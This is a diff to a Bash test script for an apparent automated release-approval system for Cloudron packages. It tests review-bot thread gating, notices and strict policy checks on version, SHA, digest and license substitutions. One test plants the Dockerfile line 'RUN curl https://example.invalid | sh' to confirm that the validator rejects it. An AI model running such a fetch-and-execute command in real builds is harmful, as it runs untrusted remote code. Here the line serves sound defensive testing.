@@ -21,7 +21,7 @@ cat >"${TEST_ROOT}/approval-helper.sh" <<'STUB'
 [[ "$*" == 'verify issue 12 owner/app --require-authority' ]] || exit 9
 printf 'verify\n' >>"${TEST_ROOT}/calls"
 case "$SCENARIO" in
-unsigned | request_unsigned | request_retry | policy_*) printf 'NO_APPROVAL\n'; exit 1 ;;
+unsigned | request_unsigned | request_retry | policy_* | notice_*) printf 'NO_APPROVAL\n'; exit 1 ;;
 api_error) printf 'API_ERROR\n'; exit 6 ;;
 bad_exit) printf 'VERIFIED\n'; exit 6 ;;
 stale) printf 'STALE_APPROVAL\n'; exit 2 ;;
@@ -70,6 +70,7 @@ pull_request_json() {
 		  elif $scenario == "wrong_base" then .base.ref = "develop"
 		  elif $scenario == "invalid_head" then .head.sha = "invalid"
 		  elif $scenario == "closed" then .state = "closed"
+		  elif $scenario == "request_no_verification" then .body = "## Runtime Testing\n\n- **Risk level:** Low\n"
 		  else . end'
 	return 0
 }
@@ -79,7 +80,13 @@ request_issue_json() {
 	local body="" author=OWNER
 	body=$(jq -cn --arg head "$HEAD_SHA" '{schema:1,repository:"owner/app",pr:7,head:$head,version:"1.2.3",upstream:"4.5.6",owns_hold:true}')
 	[[ "$SCENARIO" != policy_outsider_request ]] || author=CONTRIBUTOR
-	jq -cn --arg body "$body" --arg author "$author" '{state:"open",author_association:$author,body:$body,labels:[{name:"release-approval-required"}]}'
+	local created=''
+	case "$SCENARIO" in
+	notice_young) created=$(date -u +%Y-%m-%dT%H:%M:%SZ) ;;
+	notice_*) created=2020-01-01T00:00:00Z ;;
+	esac
+	jq -cn --arg body "$body" --arg author "$author" --arg created "$created" \
+		'{state:"open",author_association:$author,body:$body,labels:[{name:"release-approval-required"}]} + (if $created == "" then {} else {created_at:$created} end)'
 	return 0
 }
 
@@ -95,6 +102,41 @@ request_comments_json() {
 		;;
 	*) printf '[]\n' ;;
 	esac
+	return 0
+}
+
+# Comments on held PR #7; only notice_posted carries the trusted notice marker.
+pr_comments_json() {
+	if [[ "$SCENARIO" == notice_posted ]]; then
+		jq -cn --arg head "$HEAD_SHA" '[{author_association:"OWNER",body:("<!-- aidevops:cloudron-release-unsigned-notice " + $head + " -->\nnotice")}]'
+	else
+		printf '[]\n'
+	fi
+	return 0
+}
+
+# GH#39648: review-bot thread gate; open threads only where a scenario plants them.
+review_threads_response() {
+	local nodes='[]'
+	[[ "$SCENARIO" != threads_error ]] || return 1
+	if [[ "$SCENARIO" == threads_open || "$SCENARIO" == request_threads ]]; then
+		nodes='[{"isResolved":false,"comments":{"nodes":[{"author":{"login":"coderabbitai"}}]}}]'
+	fi
+	jq -cn --argjson nodes "$nodes" '{data:{repository:{pullRequest:{reviewThreads:{pageInfo:{hasNextPage:false},nodes:$nodes}}}}}'
+	return 0
+}
+
+# GH#39742: release_checks reads the paginated, slurped GraphQL check rollup
+# of the PR head (its oid follows pull_request_json's head).
+checks_rollup_response() {
+	local head="$HEAD_SHA" conclusion=SUCCESS
+	[[ "$SCENARIO" != checks_error ]] || return 1
+	[[ "$SCENARIO" != preflight_skipped ]] || conclusion=SKIPPED
+	[[ "$SCENARIO" != changed && "$SCENARIO" != policy_changed ]] || head="$OTHER_SHA"
+	jq -cn --arg head "$head" --arg conclusion "$conclusion" '
+		def run($name; $state): {__typename:"CheckRun",name:$name,status:"COMPLETED",conclusion:$state,startedAt:"2026-01-01T00:00:00Z",detailsUrl:"",checkSuite:{workflowRun:{event:"pull_request",workflow:{name:"Cloudron Catalog Publication"}}}};
+		[{data:{repository:{pullRequest:{commits:{nodes:[{commit:{oid:$head,statusCheckRollup:{contexts:{pageInfo:{hasNextPage:false},
+			nodes:[run("preflight"; $conclusion), run("publish"; "SKIPPED")]}}}}]}}}}}]'
 	return 0
 }
 
@@ -132,13 +174,8 @@ gh() {
 		;;
 	'api repos/owner/app/issues/12/comments?'*) request_comments_json ;;
 	'api repos/owner/app/issues/12') request_issue_json ;;
+	'api repos/owner/app/issues/7/comments?'*) pr_comments_json ;;
 	'api repos/owner/app/pulls/7') pull_request_json || return 1 ;;
-	'pr checks')
-		[[ "$SCENARIO" != checks_error ]] || return 1
-		local bucket=pass
-		[[ "$SCENARIO" != preflight_skipped ]] || bucket=skipping
-		jq -cn --arg bucket "$bucket" '[{bucket:$bucket,name:"preflight",link:""},{bucket:"skipping",name:"publish",link:""}]'
-		;;
 	'api repos/owner/app/contents/CloudronManifest.json?'*) printf '{"version":"1.2.3","upstreamVersion":"4.5.6","changelog":"file://CHANGELOG"}\n' ;;
 	'api repos/owner/app/contents/.github/workflows/cloudron-catalog-publish.yml?'*)
 		printf 'jobs:\n  catalog:\n    uses: marcusquinn/aidevops/.github/workflows/cloudron-catalog-publish-reusable.yml@%s\n    with:\n      aidevops_ref: %s\n' "$HEAD_SHA" "$HEAD_SHA"
@@ -180,6 +217,13 @@ gh() {
 		fi
 		;;
 	'label create') return 0 ;;
+	'api graphql')
+		if [[ "$*" == *statusCheckRollup* ]]; then
+			checks_rollup_response || return 1
+		else
+			review_threads_response || return 1
+		fi
+		;;
 	# No held worker PRs: approval processing alone (GH#36268 cases run below).
 	'pr list')
 		if [[ "$SCENARIO" == request_retry ]]; then
@@ -209,6 +253,13 @@ gh_issue_comment() {
 	local body=""
 	body=$(</dev/stdin)
 	printf 'comment %s\n' "$body" >>"${TEST_ROOT}/calls"
+	return 0
+}
+
+gh_pr_comment() {
+	local body=""
+	body=$(</dev/stdin)
+	printf 'pr-notice %s\n' "$body" >>"${TEST_ROOT}/calls"
 	return 0
 }
 
@@ -270,7 +321,7 @@ run_request_error() {
 		return 1
 	}
 	calls=$(<"${TEST_ROOT}/calls")
-	[[ "$calls" != *'pr checks'* && "$calls" != *'label create'* && "$calls" != *'pr-edit '* && "$calls" != *'create '* ]] || return 1
+	[[ "$calls" != *statusCheckRollup* && "$calls" != *'label create'* && "$calls" != *'pr-edit '* && "$calls" != *'create '* ]] || return 1
 	printf 'PASS request %s: %s\n' "$scenario" "$output"
 	return 0
 }
@@ -324,6 +375,60 @@ run_case run_failed 1 true false false
 run_case close_error 1 true false true
 printf 'PASS close failure posts no approval-invalidating comment\n'
 
+# An old unsigned non-routine request earns one PR notice per head, never an
+# issue comment (which could stale the signature); young, signed and already
+# noticed requests earn none.
+assert_notice() {
+	local scenario="$1" expected="$2" count=0 calls=''
+	run_case "$scenario" 0 false false false || return 1
+	calls=$(<"${TEST_ROOT}/calls")
+	[[ "$calls" != *'comment '* || "$calls" == *'pr-notice '* ]] || return 1
+	count=$(printf '%s\n' "$calls" | grep -c '^pr-notice ' || true)
+	[[ "$count" -eq "$expected" ]] || {
+		printf 'FAIL %s notices=%s expected=%s\n' "$scenario" "$count" "$expected"
+		return 1
+	}
+	if [[ "$expected" -eq 1 ]]; then
+		[[ "$calls" == *'approve issue 12 owner/app'* && "$calls" != *$'\ncomment '* ]] || return 1
+	fi
+	return 0
+}
+assert_notice notice_old 1
+assert_notice notice_posted 0
+assert_notice notice_young 0
+assert_notice unsigned 0
+printf 'PASS unsigned-request notice: once per head, PR-only, age-gated\n'
+
+# GH#39648: open (or uncountable) review-bot threads keep the hold without a
+# toggle or merge attempt, and queue one targeted response for the held PR.
+cat >"${TEST_ROOT}/pr-review-thread-response-scanner.sh" <<'STUB'
+#!/usr/bin/env bash
+printf 'scanner %s\n' "$*" >>"${TEST_ROOT}/calls"
+exit 0
+STUB
+chmod +x "${TEST_ROOT}/pr-review-thread-response-scanner.sh"
+jq -cn --arg path "$TEST_ROOT" '{initialized_repos:[{slug:"owner/app",app_type:"cloudron-package",path:$path}]}' >"$REPOS_FILE"
+for scenario in threads_open threads_error; do
+	run_case "$scenario" 0 false false false
+	if grep -q '^pr-edit ' "${TEST_ROOT}/calls"; then exit 1; fi
+	grep -qx "scanner dispatch-pr owner/app ${TEST_ROOT} 7" "${TEST_ROOT}/calls"
+done
+printf 'PASS approved release with open review-bot threads keeps its hold and queues a response\n'
+export SCENARIO=request_threads
+: >"${TEST_ROOT}/calls"
+rc=0
+release_request owner/app 7 >/dev/null 2>&1 || rc=$?
+[[ "$rc" -eq 3 ]]
+if grep -Eq '^(pr-edit |create |label create )' "${TEST_ROOT}/calls"; then exit 1; fi
+printf 'PASS request waits for resolved review-bot threads before any hold or issue write\n'
+export SCENARIO=threads_open
+: >"${TEST_ROOT}/calls"
+output=$(release_process false 2>/dev/null)
+[[ "$output" == *'merge would wait for resolved review-bot threads on PR #7 (dry run)'* ]]
+if grep -Eq 'merge$|pr-edit|comment |issue close|^scanner ' "${TEST_ROOT}/calls"; then exit 1; fi
+rm -f "${TEST_ROOT}/pr-review-thread-response-scanner.sh"
+printf 'PASS dry run reports the review-bot thread wait and never writes or dispatches\n'
+
 export SCENARIO=approved
 : >"${TEST_ROOT}/calls"
 release_process false
@@ -332,6 +437,16 @@ printf 'PASS dry run never writes\n'
 main process --repo owner/app --issue 12
 if grep -Eq 'merge$|pr-edit|comment |issue close' "${TEST_ROOT}/calls"; then exit 1; fi
 printf 'PASS scoped dry run retains approval checks and never writes\n'
+# A PR body with a Risk level but no Verification line fails before any write.
+export SCENARIO=request_no_verification
+: >"${TEST_ROOT}/calls"
+rm -f "${TEST_ROOT}/request"
+rc=0
+release_request owner/app 7 >/dev/null 2>"${TEST_ROOT}/err" || rc=$?
+[[ "$rc" -ne 0 ]]
+grep -q 'no recognized verification level' "${TEST_ROOT}/err"
+if grep -Eq '^(pr-edit |create |label create |issue-edit )' "${TEST_ROOT}/calls" || [[ -f "${TEST_ROOT}/request" ]]; then exit 1; fi
+printf 'PASS request refuses a PR body without Runtime Testing verification before any write\n'
 export SCENARIO=request
 rm -f "${TEST_ROOT}/merged"
 request_output=$(release_request owner/app 7)
@@ -590,6 +705,16 @@ printf 'PASS half-hour approval routine registered\n'
 	export SCENARIO=scope_denied
 	if main process --repo owner/app --issue 12 --apply; then exit 1; fi
 	printf 'PASS scoped processing retains registration, maintenance and authority gates\n'
+	# GH#39145: no registered package is a no-op; an unreadable registry still fails.
+	unset SCENARIO
+	printf '%s\n' '{"initialized_repos":[{"slug":"owner/plain"},{"slug":"owner/disabled","app_type":"cloudron-package","maintenance":false}]}' >"$REPOS_FILE"
+	: >"${TEST_ROOT}/calls"
+	main process --apply
+	[[ ! -s "${TEST_ROOT}/calls" ]]
+	printf '%s\n' '{}' >"$REPOS_FILE"
+	if main process --apply; then exit 1; fi
+	[[ ! -s "${TEST_ROOT}/calls" ]]
+	printf 'PASS empty registry is a no-op; malformed registry still fails\n'
 )
 
 # GH#36268: held worker PRs get their deferred approval request, and older
@@ -653,7 +778,12 @@ printf 'PASS half-hour approval routine registered\n'
 		local repo="$1" pr="$2"
 		printf 'request %s %s\n' "$repo" "$pr" >>"${TEST_ROOT}/calls"
 		[[ "$HELD_SCENARIO" != request_error ]] || return 1
+		[[ "$HELD_SCENARIO" != threads ]] || return 3
 		touch "${TEST_ROOT}/requested"
+		return 0
+	}
+	release_dispatch_thread_remediation() {
+		printf 'remediate %s %s\n' "$1" "$2" >>"${TEST_ROOT}/calls"
 		return 0
 	}
 	release_issues() {
@@ -756,6 +886,15 @@ printf 'PASS half-hour approval routine registered\n'
 	no_call 'pr-close 21'
 	no_call 'gh issue close 31 --repo owner/app --reason not planned'
 	printf 'PASS held: a failed request is counted; bumps main bundles are still superseded\n'
+
+	# GH#39648: open review-bot threads are a wait, not a failure, and queue a response.
+	run_held threads true 0
+	has_call 'request owner/app 22'
+	has_call 'remediate owner/app 22'
+	has_call 'pr-close 20'
+	no_call 'pr-close 21'
+	grep -q 'waits for resolved review-bot threads' "${TEST_ROOT}/held-out"
+	printf 'PASS held: open review-bot threads wait and queue a response before any request\n'
 
 	run_held signed true 0
 	no_call 'request owner/app 22'
@@ -895,6 +1034,25 @@ assert_routine not 'pinned content missing' 'del(.contents.Dockerfile)' 'missing
 # A pinned token equal to the package version may be an unrelated dependency.
 assert_routine not 'pinned package-version token' ".contents.Dockerfile.base = \"$(b64 "${BASE_DOCKERFILE}"$'ARG DEP=0.1.43\n')\" | $(dockerfile_head "${HEAD_DOCKERFILE}"$'ARG DEP=0.1.44\n')" 'pinned file changes beyond version substitution'
 assert_routine not '0.x minor upstream bump' "$(manifest_base '{"id":"io.example.app","version":"0.1.43","upstreamVersion":"0.5.3","changelog":"file://CHANGELOG"}') | $(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"0.6.0","changelog":"file://CHANGELOG"}') | .finding_upstream = \"0.6.0\"" '0.x minor upstream bump'
+# GH#39783: exercise the complete predicate with consistent manifest, pin and
+# check substitutions, not only the upstream guard in isolation.
+(
+	BASE_MANIFEST="${BASE_MANIFEST//3.39.87/0.3.0}"
+	HEAD_MANIFEST="${HEAD_MANIFEST//3.39.114/0.4.1}"
+	BASE_DOCKERFILE="${BASE_DOCKERFILE//3.39.87/0.3.0}"
+	HEAD_DOCKERFILE="${HEAD_DOCKERFILE//3.39.114/0.4.1}"
+	BASE_CHECK="${BASE_CHECK//3.39.87/0.3.0}"
+	HEAD_CHECK="${HEAD_CHECK//3.39.114/0.4.1}"
+	assert_routine not '0.3.0 to 0.4.1 default' '.finding_upstream = "0.4.1"' '0.x minor upstream bump'
+	assert_routine routine '0.3.0 to 0.4.1 signed opt-in' '.finding_upstream = "0.4.1" | .policy.zero_minor = "routine"'
+	for invalid in '"allow"' 'null' 'false' '1' '[]' '{}'; do
+		assert_routine not 'unknown zero_minor value' ".policy.zero_minor = $invalid" 'unsupported zero_minor'
+	done
+	assert_routine not 'zero minor opt-in keeps major boundary' ".policy.zero_minor = \"routine\" | $(manifest_base "${BASE_MANIFEST/0.3.0/0.9.0}") | $(manifest_head "${HEAD_MANIFEST/0.4.1/1.0.0}") | .finding_upstream = \"1.0.0\"" 'major upstream bump'
+	assert_routine not 'zero minor opt-in keeps increasing rule' ".policy.zero_minor = \"routine\" | $(manifest_head "${HEAD_MANIFEST/0.4.1/0.2.0}") | .finding_upstream = \"0.2.0\"" 'must increase'
+	assert_routine not 'zero minor opt-in keeps finding rule' '.policy.zero_minor = "routine" | .finding_upstream = "0.4.2"' 'equal the monitor finding'
+	assert_routine not 'zero minor opt-in keeps file boundary' '.policy.zero_minor = "routine" | .files += [{filename:"start.sh",status:"modified"}]' 'outside the standing policy'
+)
 check_with_first_line() {
 	local line="$1" first='main() {'
 	printf '%s\n%s%s' "$first" "$line" "${HEAD_CHECK#"$first"}"
@@ -917,17 +1075,438 @@ assert_routine not 'manifest in a looser class' '.policy.check_files += ["Cloudr
 assert_routine not 'path traversal in policy' '.policy.check_files += ["../start.sh"]' 'invalid path'
 assert_routine not 'overlapping policy classes' '.policy.check_files += ["Dockerfile"]' 'overlap'
 
+# GH#38013: SHA policies require a fresh signed mode and repository. A commit
+# fingerprint alone is not ancestry evidence, and prefixes are whole tokens.
+OLD_UPSTREAM=1234567aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+NEW_UPSTREAM=abcdef1bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+(
+	POLICY_JSON=$(jq -c '. + {upstream_mode:"commits",upstream_repository:"upstream/project"}' <<<"$POLICY_JSON")
+	BASE_MANIFEST="${BASE_MANIFEST//3.39.87/1234567}"
+	HEAD_MANIFEST="${HEAD_MANIFEST//3.39.114/abcdef1}"
+	BASE_DOCKERFILE="${BASE_DOCKERFILE//3.39.87/1234567}"
+	HEAD_DOCKERFILE="${HEAD_DOCKERFILE//3.39.114/abcdef1}"
+	BASE_CHECK="${BASE_CHECK//3.39.87/1234567}"
+	HEAD_CHECK="${HEAD_CHECK//3.39.114/abcdef1}"
+	commit_filter=".finding_upstream = \"$NEW_UPSTREAM\" | .upstream_proof = {repository:\"upstream/project\",base:\"$OLD_UPSTREAM\",head:\"$NEW_UPSTREAM\",status:\"ahead\",merge_base:\"$OLD_UPSTREAM\"}"
+	assert_routine routine 'commit forward ancestry' "$commit_filter"
+	for status in diverged behind identical; do
+		assert_routine not "commit $status" "$commit_filter | .upstream_proof.status = \"$status\"" 'strictly ahead'
+	done
+	assert_routine not 'commit missing proof' "$commit_filter | del(.upstream_proof)" 'proof repository mismatch'
+	assert_routine not 'commit wrong upstream' "$commit_filter | .upstream_proof.repository = \"other/project\"" 'proof repository mismatch'
+	assert_routine not 'commit finding mismatch' "$commit_filter | .finding_upstream = \"$OLD_UPSTREAM\"" 'equal the monitor finding'
+	assert_routine not 'commit resolved head mismatch' "$commit_filter | .upstream_proof.head = \"$OLD_UPSTREAM\"" 'proof commit mismatch'
+	assert_routine not 'commit wrong base' "$commit_filter | .upstream_proof.base = \"$NEW_UPSTREAM\"" 'proof commit mismatch'
+	assert_routine not 'commit wrong merge base' "$commit_filter | .upstream_proof.merge_base = \"$NEW_UPSTREAM\"" 'strictly ahead'
+	assert_routine not 'commit no signed mode' "$commit_filter | del(.policy.upstream_mode)" 'head upstreamVersion must be X.Y.Z'
+	assert_routine not 'commit unknown mode' "$commit_filter | .policy.upstream_mode = \"tags\"" 'unsupported upstream mode'
+	assert_routine not 'commit no signed upstream' "$commit_filter | del(.policy.upstream_repository)" 'needs an upstream repository'
+	assert_routine not 'commit extra file' "$commit_filter | .files += [{filename:\"start.sh\",status:\"modified\"}]" 'outside the standing policy'
+	for token in 1234567a a1234567 pin1234567 1234567_extra; do
+		assert_routine not "commit partial token $token" "$commit_filter | .contents.Dockerfile.base = \"$(b64 "ARG DEP=$token")\" | .contents.Dockerfile.head = \"$(b64 "ARG DEP=${token/1234567/abcdef1}")\"" 'pinned file changes beyond version substitution'
+	done
+	BASE_MANIFEST=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c --arg sha "$NEW_UPSTREAM" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE="ARG COMMIT=$OLD_UPSTREAM"
+	HEAD_DOCKERFILE="ARG COMMIT=$NEW_UPSTREAM"
+	assert_routine routine 'commit full SHA pin' "$commit_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"$OLD_UPSTREAM"}")"
+	assert_routine not 'commit license URL change is outside the signed policy' "$commit_filter" 'manifest changes beyond'
+	# GH#39115: signed license_commit_url opt-in permits only the proven full-SHA substitution.
+	license_filter="$commit_filter | .policy.license_commit_url = true"
+	assert_routine routine 'commit license URL opt-in' "$license_filter"
+	assert_routine not 'commit license URL opt-in with unproven SHA' "$license_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"${NEW_UPSTREAM}0"}")" 'manifest changes beyond'
+	assert_routine not 'commit license URL opt-in with other key' "$license_filter | $(manifest_head "${HEAD_MANIFEST/MIT/Apache}")" 'manifest changes beyond'
+	assert_routine not 'commit license URL opt-in malformed' "$license_filter | .policy.license_commit_url = \"yes\"" 'license_commit_url is invalid'
+	# Semver manifests so check_upstream passes and the opt-in mode restriction is reached.
+	semver_base=$(jq -c '.upstreamVersion = "3.39.87"' <<<"$BASE_MANIFEST")
+	semver_head=$(jq -c '.upstreamVersion = "3.39.114"' <<<"$HEAD_MANIFEST")
+	assert_routine not 'commit license URL opt-in needs commits mode' "$license_filter | .policy.upstream_mode = \"semver\" | .finding_upstream = \"3.39.114\" | $(manifest_base "$semver_base") | $(manifest_head "$semver_head")" 'license_commit_url needs a commits policy'
+	assert_routine not 'commit license URL abbreviated head is rejected' "$license_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/abcdef1}")" 'manifest changes beyond'
+	assert_routine routine 'commit license URL opt-in accepts an unchanged license' "$license_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"$OLD_UPSTREAM"}")"
+	assert_routine not 'commit license absent vs null' "$license_filter | $(manifest_base "$(jq -c 'del(.upstreamLicense)' <<<"$BASE_MANIFEST")") | $(manifest_head "$(jq -c '.upstreamLicense = null' <<<"$HEAD_MANIFEST")")" 'manifest changes beyond'
+	# Coincident keys: full old SHA in the Dockerfile may become the short new version.
+	collision_base=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamVersion = $sha' <<<"$BASE_MANIFEST")
+	collision_head=$(jq -c --arg sha "$OLD_UPSTREAM" '.upstreamVersion = "abcdef1" | .upstreamLicense.url |= sub("[0-9a-f]{40}"; $sha)' <<<"$HEAD_MANIFEST")
+	collision_filter="del(.files[4]) | $commit_filter | $(manifest_base "$collision_base") | $(manifest_head "$collision_head")"
+	assert_routine routine 'commit full-to-abbreviated pin' "$collision_filter | $(dockerfile_head "ARG COMMIT=abcdef1")"
+	assert_routine routine 'commit full-to-full pin with coincident keys' "$collision_filter"
+	assert_routine not 'commit coincident keys wrong pin' "$collision_filter | $(dockerfile_head "ARG COMMIT=abcdef2")" 'pinned file changes beyond version substitution'
+	unchanged_license_head="${HEAD_MANIFEST/"$NEW_UPSTREAM"/"$OLD_UPSTREAM"}"
+	assert_routine not 'commit wrong full SHA pin' "$commit_filter | $(manifest_head "$unchanged_license_head") | $(dockerfile_head "ARG COMMIT=${NEW_UPSTREAM}0")" 'pinned file changes beyond version substitution'
+	assert_routine not 'commit wrong license URL' "$commit_filter | $(manifest_head "${HEAD_MANIFEST/"$NEW_UPSTREAM"/"${NEW_UPSTREAM}0"}")" 'manifest changes beyond'
+	assert_routine not 'commit license metadata changed' "$commit_filter | $(manifest_head "${unchanged_license_head/MIT/Apache}")" 'manifest changes beyond'
+)
+# GH#38364: semver policies may opt in to proven release-commit and image-digest pins.
+(
+	OLD_C=1111111111111111111111111111111111111111
+	NEW_C=2222222222222222222222222222222222222222
+	D_OLD="sha256:$(printf 'a%.0s' {1..64})"
+	D_NEW="sha256:$(printf 'b%.0s' {1..64})"
+	D_BAD="sha256:$(printf 'c%.0s' {1..64})"
+	POLICY_JSON=$(jq -c '. + {upstream_repository:"upstream/project",release_identity:{commit_arg:"APP_COMMIT",images_json_asset:"images.json"}}' <<<"$POLICY_JSON")
+	BASE_MANIFEST=$(jq -c --arg sha "$OLD_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c --arg sha "$NEW_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE=$'FROM ghcr.io/up/svc:v3.39.87@'"${D_OLD}"$'\nARG APP_COMMIT='"${OLD_C}"$'\nARG AIDEVOPS_VERSION=3.39.87\n'
+	HEAD_DOCKERFILE=$'FROM ghcr.io/up/svc:v3.39.114@'"${D_NEW}"$'\nARG APP_COMMIT='"${NEW_C}"$'\nARG AIDEVOPS_VERSION=3.39.114\n'
+	BASE_DOCKERFILE="${BASE_DOCKERFILE//v3.39.87/3.39.87}"
+	HEAD_DOCKERFILE="${HEAD_DOCKERFILE//v3.39.114/3.39.114}"
+	id_filter=".upstream_proof = null | .release_proof = {repository:\"upstream/project\",asset:\"images.json\",old_commit:\"$OLD_C\",new_commit:\"$NEW_C\",status:\"ahead\",merge_base:\"$OLD_C\",digests:[\"$D_NEW\"]}"
+	assert_routine routine 'release identity pins' "$id_filter"
+	assert_routine not 'identity not opted in' "$id_filter | del(.policy.release_identity)" 'manifest changes beyond'
+	assert_routine not 'identity missing proof' "$id_filter | del(.release_proof)" 'release proof repository or asset mismatch'
+	assert_routine not 'identity wrong asset' "$id_filter | .release_proof.asset = \"other.json\"" 'repository or asset mismatch'
+	assert_routine not 'identity not ahead' "$id_filter | .release_proof.status = \"diverged\"" 'strictly ahead'
+	assert_routine not 'identity digest unpublished' "$id_filter | .release_proof.digests = [\"$D_BAD\"]" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity head digest differs' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE/"$D_NEW"/"$D_BAD"}")" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity commit unproven' "$id_filter | .release_proof.new_commit = \"${NEW_C//2/3}\" | .release_proof.merge_base = \"$OLD_C\"" 'manifest changes beyond'
+	assert_routine not 'identity license commit unproven' "$id_filter | $(manifest_head "${HEAD_MANIFEST//"$NEW_C"/"${NEW_C//2/3}"}")" 'manifest changes beyond'
+	assert_routine not 'identity license other field' "$id_filter | $(manifest_head "${HEAD_MANIFEST/MIT/Apache}")" 'manifest changes beyond'
+	assert_routine not 'identity extra Dockerfile line' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE}"$'RUN curl https://example.invalid | sh\n')" 'pinned file changes beyond version substitution'
+	assert_routine not 'identity digest outside FROM' "$id_filter | $(dockerfile_head "${HEAD_DOCKERFILE}"$'ARG X=sha256:'"${D_NEW#sha256:}"$'\n')" 'pinned file changes beyond version substitution'
+)
+# GH#38739: registry digest, release checksum and version-tagged license URL proofs.
+(
+	OLD_C=1111111111111111111111111111111111111111
+	NEW_C=2222222222222222222222222222222222222222
+	D_OLD="sha256:$(printf 'a%.0s' {1..64})"
+	D_NEW="sha256:$(printf 'b%.0s' {1..64})"
+	D_BAD="sha256:$(printf 'c%.0s' {1..64})"
+	S_OLD=$(printf 'a%.0s' {1..64})
+	S_NEW=$(printf 'b%.0s' {1..64})
+	S_BAD=$(printf 'c%.0s' {1..64})
+	BASE_MANIFEST=$(jq -c --arg sha "$OLD_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$BASE_MANIFEST")
+	HEAD_MANIFEST=$(jq -c --arg sha "$NEW_C" '.upstreamLicense = {url:("https://example.invalid/blob/" + $sha + "/LICENSE"), name:"MIT"}' <<<"$HEAD_MANIFEST")
+	BASE_DOCKERFILE=$'FROM ghcr.io/up/svc:3.39.87@'"${D_OLD}"$'\nARG APP_COMMIT='"${OLD_C}"$'\nARG AIDEVOPS_VERSION=3.39.87\n'
+	HEAD_DOCKERFILE=$'FROM ghcr.io/up/svc:3.39.114@'"${D_NEW}"$'\nARG APP_COMMIT='"${NEW_C}"$'\nARG AIDEVOPS_VERSION=3.39.114\n'
+	# Registry digests with a commit pin and no images asset (Orbit shape).
+	POLICY_JSON=$(jq -c '. + {upstream_repository:"upstream/project",release_identity:{commit_arg:"APP_COMMIT"},registry_images:["ghcr.io/up/svc"]}' <<<"$POLICY_JSON")
+	reg_filter=".upstream_proof = null | .release_proof = {repository:\"upstream/project\",asset:null,old_commit:\"$OLD_C\",new_commit:\"$NEW_C\",status:\"ahead\",merge_base:\"$OLD_C\",digests:[]} | .pin_proof = {registry:{\"ghcr.io/up/svc:3.39.114\":\"$D_NEW\"}}"
+	assert_routine routine 'registry digest pin' "$reg_filter"
+	commit_tag_base="${BASE_DOCKERFILE/svc:3.39.87/svc:$OLD_C}"
+	commit_tag_head="${HEAD_DOCKERFILE/svc:3.39.114/svc:$NEW_C}"
+	assert_routine not 'registry commit tag outside version scope' "$reg_filter | .pin_proof.registry = {\"ghcr.io/up/svc:$NEW_C\":\"$D_NEW\"} | .contents.Dockerfile.base = \"$(b64 "$commit_tag_base")\" | $(dockerfile_head "$commit_tag_head")" 'registry_images'
+	assert_routine not 'registry digest unresolved' "$reg_filter | .pin_proof.registry = {}" 'registry_images'
+	assert_routine not 'registry digest mismatch' "$reg_filter | .pin_proof.registry[\"ghcr.io/up/svc:3.39.114\"] = \"$D_BAD\"" 'registry_images'
+	assert_routine not 'registry proof missing' "$reg_filter | del(.pin_proof)" 'pin proof is missing'
+	assert_routine not 'registry image not signed' "$reg_filter | .policy.registry_images = [\"ghcr.io/up/other\"]" 'registry_images'
+	assert_routine not 'registry digest without tag change' "$reg_filter | $(dockerfile_head "${HEAD_DOCKERFILE/svc:3.39.114/svc:3.39.87}")" 'registry_images'
+	assert_routine not 'registry unlisted second image' "$reg_filter | .contents.Dockerfile.base = \"$(b64 "${BASE_DOCKERFILE}"$'FROM other/dash:2.1.0@'"${D_OLD}"$'\n')\" | $(dockerfile_head "${HEAD_DOCKERFILE}"$'FROM other/dash:2.1.0@'"${D_NEW}"$'\n')" 'registry_images'
+	assert_routine not 'registry digest with identity asset digests only' "$reg_filter | .release_proof.digests = [\"$D_NEW\"]" 'release proof digests are invalid'
+	assert_routine not 'registry non-string image element' "$reg_filter | .policy.registry_images = [{}]" 'registry_images is invalid'
+	# A version moved into the repository path must not authorize an unrelated tag.
+	path_base=$'FROM ghcr.io/up/svc-3.39.87:2.1.0@'"${D_OLD}"$'\nARG APP_COMMIT='"${OLD_C}"$'\nARG AIDEVOPS_VERSION=3.39.87\n'
+	path_head=$'FROM ghcr.io/up/svc-3.39.114:2.1.0@'"${D_NEW}"$'\nARG APP_COMMIT='"${NEW_C}"$'\nARG AIDEVOPS_VERSION=3.39.114\n'
+	assert_routine not 'registry repository path substitution' "$reg_filter | .policy.registry_images = [\"ghcr.io/up/svc-3.39.114\"] | .pin_proof.registry = {\"ghcr.io/up/svc-3.39.114:2.1.0\":\"$D_NEW\"} | .contents.Dockerfile.base = \"$(b64 "$path_base")\" | $(dockerfile_head "$path_head")" 'registry_images'
+	assert_routine not 'registry unknown policy field' "$reg_filter | .policy.surprise = true" 'unknown field'
+	assert_routine not 'registry invalid image' "$reg_filter | .policy.registry_images = [\"evil.example/up/svc\"]" 'registry_images is invalid'
+	# Release checksum and version-substituted license URL (Headscale shape).
+	POLICY_JSON=$(jq -c 'del(.release_identity, .registry_images) | . + {upstream_repository:"upstream/project",release_checksum:{arg:"APP_SHA256",asset:"checksums.txt",file:"app_{version}_linux_amd64"},license_version_url:true}' <<<"$POLICY_JSON")
